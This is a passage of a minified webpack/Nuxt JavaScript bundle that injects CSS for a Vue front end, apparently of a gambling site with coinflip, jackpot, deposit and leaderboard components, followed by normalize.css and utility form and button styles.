        (e = r(3)(!1)).push([t.i, ".bet[data-v-12ea7b0b]{display:grid}.bet .bet__controls[data-v-12ea7b0b],.bet .bet__option-selector[data-v-12ea7b0b],.bet .bet__user-asset-selector[data-v-12ea7b0b]{text-align:center;margin-top:.25rem;margin-bottom:.25rem}.bet .bet__controls .title[data-v-12ea7b0b],.bet .bet__option-selector .title[data-v-12ea7b0b],.bet .bet__user-asset-selector .title[data-v-12ea7b0b]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));font-size:1.125rem}.bet .current-value[data-v-12ea7b0b],.bet .max-value[data-v-12ea7b0b],.bet .min-value[data-v-12ea7b0b]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(131);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".option-selector .option-selector__list[data-v-36d909ff]{display:flex;justify-content:center}.option-selector .option-selector__list .list__item[data-v-36d909ff]{margin-left:.5rem;margin-right:.5rem}.option-selector .option-selector__list .list__item .item__img[data-v-36d909ff]{border-radius:9999px}.option-selector .option-selector__list .list__item .item__img.isSelected[data-v-36d909ff]{border-width:4px;--border-opacity:1;border-color:#2196f3;border-color:rgba(33,150,243,var(--border-opacity))}.option-selector .option-selector__list .list__item .item__img.isDisabled[data-v-36d909ff]{opacity:.25}", ""]), t.exports = e
    }, , , function(t, e, r) {
        "use strict";
        var n = r(132);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".user-asset-selector .user-asset-selector__controls .controls__form[data-v-0b5cdc82]{display:flex;justify-content:center;align-items:center}.user-asset-selector .user-asset-selector__controls .controls__form .form__input[data-v-0b5cdc82]{width:100%}.user-asset-selector .user-asset-selector__controls .controls__form .form__checkbox[data-v-0b5cdc82],.user-asset-selector .user-asset-selector__controls .controls__form .form__select[data-v-0b5cdc82]{width:50%}@media (min-width:768px){.user-asset-selector .user-asset-selector__controls .controls__form .form__checkbox[data-v-0b5cdc82],.user-asset-selector .user-asset-selector__controls .controls__form .form__input[data-v-0b5cdc82],.user-asset-selector .user-asset-selector__controls .controls__form .form__select[data-v-0b5cdc82]{width:33.333333%}}.user-asset-selector .user-asset-selector__controls .controls__list[data-v-0b5cdc82]{margin-top:.25rem;display:grid;grid-row-gap:.5rem;row-gap:.5rem;grid-column-gap:.5rem;-moz-column-gap:.5rem;column-gap:.5rem;overflow-y:auto;overflow-x:hidden;max-height:250px}@media (min-width:768px){.user-asset-selector .user-asset-selector__controls .controls__list[data-v-0b5cdc82]{grid-template-columns:repeat(2,minmax(0,1fr))}}.user-asset-selector .user-asset-selector__controls .controls__list .list__item[data-v-0b5cdc82]{--bg-opacity:1;background-color:#2b2c37;background-color:rgba(43,44,55,var(--bg-opacity));border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item[data-v-0b5cdc82]{position:relative}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item__details[data-v-0b5cdc82]{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));align-items:center;justify-content:center}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item__details .details__image[data-v-0b5cdc82]{display:grid;justify-content:center}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item__details .details__label[data-v-0b5cdc82]{text-align:center}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item__details .details__label.isTruncated[data-v-0b5cdc82]{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item__details .details__label.isValue[data-v-0b5cdc82]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item__overlay[data-v-0b5cdc82]{--bg-opacity:1;background-color:#000;background-color:rgba(0,0,0,var(--bg-opacity));--bg-opacity:0.5;position:absolute;top:0;left:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;border-radius:.25rem}.user-asset-selector .user-asset-selector__controls .controls__list .list__item .item__pill[data-v-0b5cdc82]{padding:.25rem .5rem;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));font-size:.75rem;text-transform:uppercase;border-radius:9999px;--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(133);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".form-checkbox[data-v-490b1e20]{width:2rem;height:2rem}.checkbox[data-v-490b1e20]{display:flex;align-items:center}.checkbox .label[data-v-490b1e20]{margin-left:.25rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(134);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".deposit[data-v-bf9bade6]{display:grid}.deposit .deposit__controls[data-v-bf9bade6],.deposit .deposit__user-asset-selector[data-v-bf9bade6]{text-align:center;margin-top:.25rem;margin-bottom:.25rem}.deposit .deposit__controls .title[data-v-bf9bade6],.deposit .deposit__user-asset-selector .title[data-v-bf9bade6]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));font-size:1.125rem}.deposit .current-value[data-v-bf9bade6]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(135);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".claims__list[data-v-1b2451a6]{margin-top:.5rem;display:grid;grid-template-columns:repeat(2,minmax(0,1fr));grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;grid-row-gap:.25rem;row-gap:.25rem;overflow-y:auto;max-height:500px}.claims__list .list__item[data-v-1b2451a6]{--bg-opacity:1;background-color:#2b2c37;background-color:rgba(43,44,55,var(--bg-opacity));border-radius:.25rem;padding:.25rem .5rem}.claims__list .list__item .item__data[data-v-1b2451a6]{display:flex}.claims__list .list__item .item__data .data__label[data-v-1b2451a6]{margin-right:.5rem}.claims__list .list__item .item__data .data__value[data-v-1b2451a6]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));margin-left:auto}", ""]), t.exports = e
    }, , function(t, e, r) {
        "use strict";
        var n = r(136);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".fetch-branding[data-v-2c6716b7]{margin-bottom:1rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(137);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".user-profile[data-v-e578885a]{display:grid;justify-content:center}.user-profile .user-profile__info[data-v-e578885a]{display:grid;grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;grid-row-gap:.25rem;row-gap:.25rem;align-items:center}@media (min-width:768px){.user-profile .user-profile__info[data-v-e578885a]{grid-template-columns:repeat(2,minmax(0,1fr))}}.user-profile .user-profile__info .info__user[data-v-e578885a]{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));justify-content:center;align-items:center;text-align:center}.user-profile .user-profile__info .info__user .user__image-holder[data-v-e578885a]{display:grid;justify-content:center}.user-profile .user-profile__info .info__user .user__image-holder .image-holder__image[data-v-e578885a]{border-radius:9999px}.user-profile .user-profile__info .info__user .user__data[data-v-e578885a]{font-size:1.25rem}.user-profile .user-profile__info .info__user .user__data .data__name[data-v-e578885a]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.user-profile .user-profile__info .info__buttons[data-v-e578885a]{display:grid;font-size:1rem;grid-row-gap:.25rem;row-gap:.25rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(138);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".media-links[data-v-214a0dcb]{margin-top:.5rem;display:flex;justify-content:center}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(139);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".exchange .exchange__title[data-v-61f24650]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));text-align:center;margin-top:.25rem;margin-bottom:.25rem}.exchange .exchange__forms[data-v-61f24650]{display:grid;grid-row-gap:.5rem;row-gap:.5rem}.exchange .exchange__forms .forms__item[data-v-61f24650]{display:grid;grid-row-gap:.25rem;row-gap:.25rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(140);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".user-jackpot-history-list[data-v-c30cab2a]{display:grid;grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;grid-row-gap:.25rem;row-gap:.25rem;overflow-y:auto;max-height:500px}@media (min-width:768px){.user-jackpot-history-list[data-v-c30cab2a]{grid-template-columns:repeat(3,minmax(0,1fr))}}.user-jackpot-history-list .user-jackpot-history-list__item[data-v-c30cab2a]{--bg-opacity:1;background-color:#2b2c37;background-color:rgba(43,44,55,var(--bg-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(141);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".user-coinflip-history-list[data-v-5cacb4d3]{display:grid;grid-row-gap:.25rem;row-gap:.25rem;overflow-y:auto;max-height:500px}.user-coinflip-history-list .user-coinflip-history-list__item[data-v-5cacb4d3]{--bg-opacity:1;background-color:#2b2c37;background-color:rgba(43,44,55,var(--bg-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(142);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".coinflip-buttons[data-v-f5d48164]{display:flex;justify-content:center}.coinflip-display[data-v-f5d48164]{display:grid;grid-template-columns:repeat(1,minmax(0,1fr))}.coinflip-display .coinflip-display__header[data-v-f5d48164]{margin-bottom:.5rem;display:grid;grid-template-columns:repeat(2,minmax(0,1fr));align-items:center;justify-content:center}@media (min-width:768px){.coinflip-display .coinflip-display__header[data-v-f5d48164]{grid-template-columns:repeat(3,minmax(0,1fr))}}.coinflip-display .coinflip-display__header .header__state[data-v-f5d48164]{display:grid;justify-content:center;align-items:center;grid-column:span 2/span 2;grid-row-start:1}@media (min-width:768px){.coinflip-display .coinflip-display__header .header__state[data-v-f5d48164]{grid-column:span 1/span 1;grid-column-start:2}}.coinflip-display .coinflip-display__details[data-v-f5d48164]{display:grid;justify-content:center;font-size:.875rem;margin-bottom:.5rem}.coinflip-display .coinflip-display__details .detail[data-v-f5d48164]{display:flex}.coinflip-display .coinflip-display__details .detail .detail__label[data-v-f5d48164]{margin-right:.5rem}.coinflip-display .coinflip-display__details .detail .detail__value[data-v-f5d48164]{margin-left:auto;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.coinflip-display .coinflip-display__user-asset-lists[data-v-f5d48164]{display:grid;grid-template-columns:repeat(2,minmax(0,1fr))}.coinflip-display .coinflip-display__footer[data-v-f5d48164]{display:flex;justify-content:center}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(143);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".coinflip-display__user[data-v-1f87b090]{display:grid;grid-row-gap:.25rem;row-gap:.25rem;justify-content:center}.coinflip-display__user .user__header[data-v-1f87b090]{position:relative}.coinflip-display__user .user__header .header__avatar[data-v-1f87b090]{margin-left:auto;margin-right:auto;border-radius:9999px;cursor:pointer;transition-property:all;transition-duration:.2s}.coinflip-display__user .user__header .header__avatar.isWinner[data-v-1f87b090]{border-width:4px;--border-opacity:1;border-color:#2196f3;border-color:rgba(33,150,243,var(--border-opacity))}.coinflip-display__user .user__header .header__option[data-v-1f87b090]{position:absolute;border-radius:9999px;bottom:0}.coinflip-display__user .user__body[data-v-1f87b090]{text-align:center}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(144);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".coinflip-display__user-asset-list-header[data-v-057234b7]{--bg-opacity:1;background-color:#2b2c37;background-color:rgba(43,44,55,var(--bg-opacity));display:grid;grid-template-columns:repeat(2,minmax(0,1fr));justify-content:center;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06);border-radius:.25rem;margin-left:.5rem;margin-right:.5rem;padding:.5rem}.coinflip-display__user-asset-list-header .percent[data-v-057234b7]{text-align:left}.coinflip-display__user-asset-list-header .bet[data-v-057234b7]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));text-align:right}.coinflip-display__user-asset-list[data-v-057234b7]{display:flex;flex-direction:column;overflow-y:auto}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(145);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".user-asset-list__item[data-v-764b021e]{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));justify-content:center;align-items:center}.user-asset-list__item .item__image[data-v-764b021e]{display:flex;justify-content:center}.user-asset-list__item .item__name[data-v-764b021e]{text-align:center;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.user-asset-list__item .item__value[data-v-764b021e]{text-align:center;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(146);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".statistics[data-v-913e5ac8]{justify-content:center}.statistics[data-v-913e5ac8],.statistics .statistics__biggest-games[data-v-913e5ac8]{display:grid}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(147);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".leaderboard[data-v-2ae7a4d3]{display:grid;justify-content:center}.leaderboard .leaderboard__list[data-v-2ae7a4d3]{display:grid;grid-row-gap:.25rem;row-gap:.25rem}.leaderboard .leaderboard__list .list__item[data-v-2ae7a4d3]{display:grid;grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;align-items:center;grid-template-columns:.1fr 1fr 1fr}.leaderboard .leaderboard__list .list__item .item__hash.isWhite[data-v-2ae7a4d3]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.leaderboard .leaderboard__list .list__item .item__profit[data-v-2ae7a4d3]{text-align:right}.leaderboard .leaderboard__list .list__item .item__profit .profit__value[data-v-2ae7a4d3]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.leaderboard .leaderboard__list .list__item .item__user .user__image[data-v-2ae7a4d3]{border-radius:9999px;display:inline}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(148);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".coinflip-history-list[data-v-23b57cc0]{display:grid;grid-row-gap:.25rem;row-gap:.25rem;overflow-y:auto;max-height:500px}.coinflip-history-list .coinflip-history-list__item[data-v-23b57cc0]{--bg-opacity:1;background-color:#2b2c37;background-color:rgba(43,44,55,var(--bg-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(149);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".faq__title[data-v-e61db20a]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));text-align:center}.faq__list[data-v-e61db20a]{display:grid;margin-left:.5rem;margin-right:.5rem;overflow-y:auto;max-height:500px}.faq__list .list__item .item__question[data-v-e61db20a]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.faq__list .list__item .item__bullets[data-v-e61db20a]{list-style-type:disc;margin-left:.5rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(150);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".tos__title[data-v-024d90b0]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));text-align:center}.tos__list[data-v-024d90b0]{display:grid;margin-left:.5rem;margin-right:.5rem;overflow-y:auto;max-height:500px}.tos__list .list__item .item__title[data-v-024d90b0]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(151);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".__nuxt-error-page{padding:1rem;background:#f7f8fb;color:#47494e;text-align:center;display:flex;justify-content:center;align-items:center;flex-direction:column;font-family:sans-serif;font-weight:100!important;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-webkit-font-smoothing:antialiased;position:absolute;top:0;left:0;right:0;bottom:0}.__nuxt-error-page .error{max-width:450px}.__nuxt-error-page .title{font-size:1.5rem;margin-top:15px;color:#47494e;margin-bottom:8px}.__nuxt-error-page .description{color:#7f828b;line-height:21px;margin-bottom:10px}.__nuxt-error-page a{color:#7f828b!important;text-decoration:none}.__nuxt-error-page .logo{position:fixed;left:12px;bottom:12px}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(152);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".nuxt-progress{position:fixed;top:0;left:0;right:0;height:.25rem;width:0;opacity:1;transition:width .1s,opacity .4s;background-color:#2196f3;z-index:999999}.nuxt-progress.nuxt-progress-notransition{transition:none}.nuxt-progress-failed{background-color:#f56565}", ""]), t.exports = e
    }, , , function(t, e, r) {
        (e = r(3)(!1)).push([t.i, "/*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}[hidden],template{display:none}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}button{background-color:transparent;background-image:none}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}fieldset,ol,ul{margin:0;padding:0}ol,ul{list-style:none}html{font-family:Rubik,Lato,Helvetica;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}hr{border-top-width:1px}img{border-style:solid}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{color:#a0aec0}input:-ms-input-placeholder,textarea:-ms-input-placeholder{color:#a0aec0}input::-ms-input-placeholder,textarea::-ms-input-placeholder{color:#a0aec0}input::placeholder,textarea::placeholder{color:#a0aec0}[role=button],button{cursor:pointer}table{border-collapse:collapse}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}button,input,optgroup,select,textarea{padding:0;line-height:inherit;color:inherit}code,kbd,pre,samp{font-family:Menlo,Monaco,Consolas,\"Liberation Mono\",\"Courier New\",monospace}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}@-webkit-keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@-webkit-keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@-webkit-keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@-webkit-keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}.form-input{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#e2e8f0;border-width:1px;border-radius:.25rem;padding:.5rem .75rem;font-size:1rem;line-height:1.5}.form-input::-moz-placeholder{color:#a0aec0;opacity:1}.form-input:-ms-input-placeholder{color:#a0aec0;opacity:1}.form-input::-ms-input-placeholder{color:#a0aec0;opacity:1}.form-input::placeholder{color:#a0aec0;opacity:1}.form-input:focus{outline:none;box-shadow:0 0 0 3px rgba(66,153,225,.5);border-color:#63b3ed}.form-textarea{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#e2e8f0;border-width:1px;border-radius:.25rem;padding:.5rem .75rem;font-size:1rem;line-height:1.5}.form-textarea::-moz-placeholder{color:#a0aec0;opacity:1}.form-textarea:-ms-input-placeholder{color:#a0aec0;opacity:1}.form-textarea::-ms-input-placeholder{color:#a0aec0;opacity:1}.form-textarea::placeholder{color:#a0aec0;opacity:1}.form-textarea:focus{outline:none;box-shadow:0 0 0 3px rgba(66,153,225,.5);border-color:#63b3ed}.form-multiselect{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#e2e8f0;border-width:1px;border-radius:.25rem;padding:0 .75rem;font-size:1rem;line-height:inherit}.form-multiselect:focus{outline:none;box-shadow:0 0 0 3px rgba(66,153,225,.5);border-color:#63b3ed}.form-select{background-image:url(\"data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23a0aec0'%3E%3Cpath d='M15.3 9.3a1 1 0 011.4 1.4l-4 4a1 1 0 01-1.4 0l-4-4a1 1 0 011.4-1.4l3.3 3.29 3.3-3.3z'/%3E%3C/svg%3E\");-webkit-appearance:none;-moz-appearance:none;appearance:none;-webkit-print-color-adjust:exact;color-adjust:exact;background-repeat:no-repeat;background-color:#fff;border-color:#e2e8f0;border-width:1px;border-radius:.25rem;padding:0 2.5rem 0 .75rem;font-size:1rem;line-height:inherit;background-position:right .5rem center;background-size:1.5em 1.5em}.form-select::-ms-expand{color:#a0aec0;border:none}@media not print{.form-select::-ms-expand{display:none}}@media print and (-ms-high-contrast:active),print and (-ms-high-contrast:none){.form-select{padding-right:.75rem}}.form-select:focus{outline:none;box-shadow:0 0 0 3px rgba(66,153,225,.5);border-color:#63b3ed}.form-checkbox:checked{background-image:url(\"data:image/svg+xml;charset=utf-8,%3Csvg viewBox='0 0 16 16' fill='%23fff' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M5.707 7.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4a1 1 0 00-1.414-1.414L7 8.586 5.707 7.293z'/%3E%3C/svg%3E\");border-color:transparent;background-color:currentColor;background-size:100% 100%;background-position:50%;background-repeat:no-repeat}@media not print{.form-checkbox::-ms-check{border-width:1px;color:transparent;background:inherit;border-color:inherit;border-radius:inherit}}.form-checkbox{-webkit-appearance:none;-moz-appearance:none;appearance:none;-webkit-print-color-adjust:exact;color-adjust:exact;display:inline-block;vertical-align:middle;background-origin:border-box;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;flex-shrink:0;height:1em;width:1em;color:#4299e1;background-color:#fff;border-color:#e2e8f0;border-width:1px;border-radius:.25rem}.form-checkbox:focus{outline:none;box-shadow:0 0 0 3px rgba(66,153,225,.5);border-color:#63b3ed}.form-radio:checked{background-image:url(\"data:image/svg+xml;charset=utf-8,%3Csvg viewBox='0 0 16 16' fill='%23fff' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='8' cy='8' r='3'/%3E%3C/svg%3E\");border-color:transparent;background-color:currentColor;background-size:100% 100%;background-position:50%;background-repeat:no-repeat}@media not print{.form-radio::-ms-check{border-width:1px;color:transparent;background:inherit;border-color:inherit;border-radius:inherit}}.form-radio{-webkit-appearance:none;-moz-appearance:none;appearance:none;-webkit-print-color-adjust:exact;color-adjust:exact;display:inline-block;vertical-align:middle;background-origin:border-box;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;flex-shrink:0;border-radius:100%;height:1em;width:1em;color:#4299e1;background-color:#fff;border-color:#e2e8f0;border-width:1px}.form-radio:focus{outline:none;box-shadow:0 0 0 3px rgba(66,153,225,.5);border-color:#63b3ed}.form-input-dark,.form-multiselect-dark,.form-textarea-dark{background-color:#16181f;border-color:#24252f}.form-checkbox-dark,.form-radio-dark,.form-select-dark{background-color:#16181f;border-color:#24252f}@media (min-width:640px){.sm\\:container{width:100%}}@media (min-width:640px) and (min-width:640px){.sm\\:container{max-width:640px}}@media (min-width:640px) and (min-width:768px){.sm\\:container{max-width:768px}}@media (min-width:640px) and (min-width:1024px){.sm\\:container{max-width:1024px}}@media (min-width:640px) and (min-width:1280px){.sm\\:container{max-width:1280px}}@media (min-width:768px){.md\\:container{width:100%}}@media (min-width:768px) and (min-width:640px){.md\\:container{max-width:640px}}@media (min-width:768px) and (min-width:768px){.md\\:container{max-width:768px}}@media (min-width:768px) and (min-width:1024px){.md\\:container{max-width:1024px}}@media (min-width:768px) and (min-width:1280px){.md\\:container{max-width:1280px}}@media (min-width:1024px){.lg\\:container{width:100%}}@media (min-width:1024px) and (min-width:640px){.lg\\:container{max-width:640px}}@media (min-width:1024px) and (min-width:768px){.lg\\:container{max-width:768px}}@media (min-width:1024px) and (min-width:1024px){.lg\\:container{max-width:1024px}}@media (min-width:1024px) and (min-width:1280px){.lg\\:container{max-width:1280px}}@media (min-width:1280px){.xl\\:container{width:100%}}@media (min-width:1280px) and (min-width:640px){.xl\\:container{max-width:640px}}@media (min-width:1280px) and (min-width:768px){.xl\\:container{max-width:768px}}@media (min-width:1280px) and (min-width:1024px){.xl\\:container{max-width:1024px}}@media (min-width:1280px) and (min-width:1280px){.xl\\:container{max-width:1280px}}", ""]), t.exports = e
    }, function(t, e, r) {
        var content = r(398);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("43f27eb2", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, '.btn{padding:.25rem 1rem;border-radius:.25rem;transition-property:background-color,border-color,color,fill,stroke;transition-duration:.5s}.btn:disabled,.btn[disabled=disabled]{--bg-opacity:1!important;background-color:#4a5568!important;background-color:rgba(74,85,104,var(--bg-opacity))!important;--text-opacity:1!important;color:#718096!important;color:rgba(113,128,150,var(--text-opacity))!important;pointer-events:none}.btn.btn-full{width:100%}.btn.btn-blue{--bg-opacity:1;background-color:#2196f3;background-color:rgba(33,150,243,var(--bg-opacity));--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.btn.btn-blue:hover{--bg-opacity:1;background-color:#2b6cb0;background-color:rgba(43,108,176,var(--bg-opacity))}.btn.btn-red{--bg-opacity:1;background-color:#f56565;background-color:rgba(245,101,101,var(--bg-opacity));--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.btn.btn-red:hover{--bg-opacity:1;background-color:#c53030;background-color:rgba(197,48,48,var(--bg-opacity))}.btn.btn-green{--bg-opacity:1;background-color:#48bb78;background-color:rgba(72,187,120,var(--bg-opacity));--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.btn.btn-green:hover{--bg-opacity:1;background-color:#2f855a;background-color:rgba(47,133,90,var(--bg-opacity))}.btn.btn-yellow{--bg-opacity:1;background-color:#febd01;background-color:rgba(254,189,1,var(--bg-opacity));--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.btn.btn-yellow:hover{--bg-opacity:1;background-color:#d69e2e;background-color:rgba(214,158,46,var(--bg-opacity))}.btn.btn-gray{--bg-opacity:1;background-color:#4a5568;background-color:rgba(74,85,104,var(--bg-opacity));--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.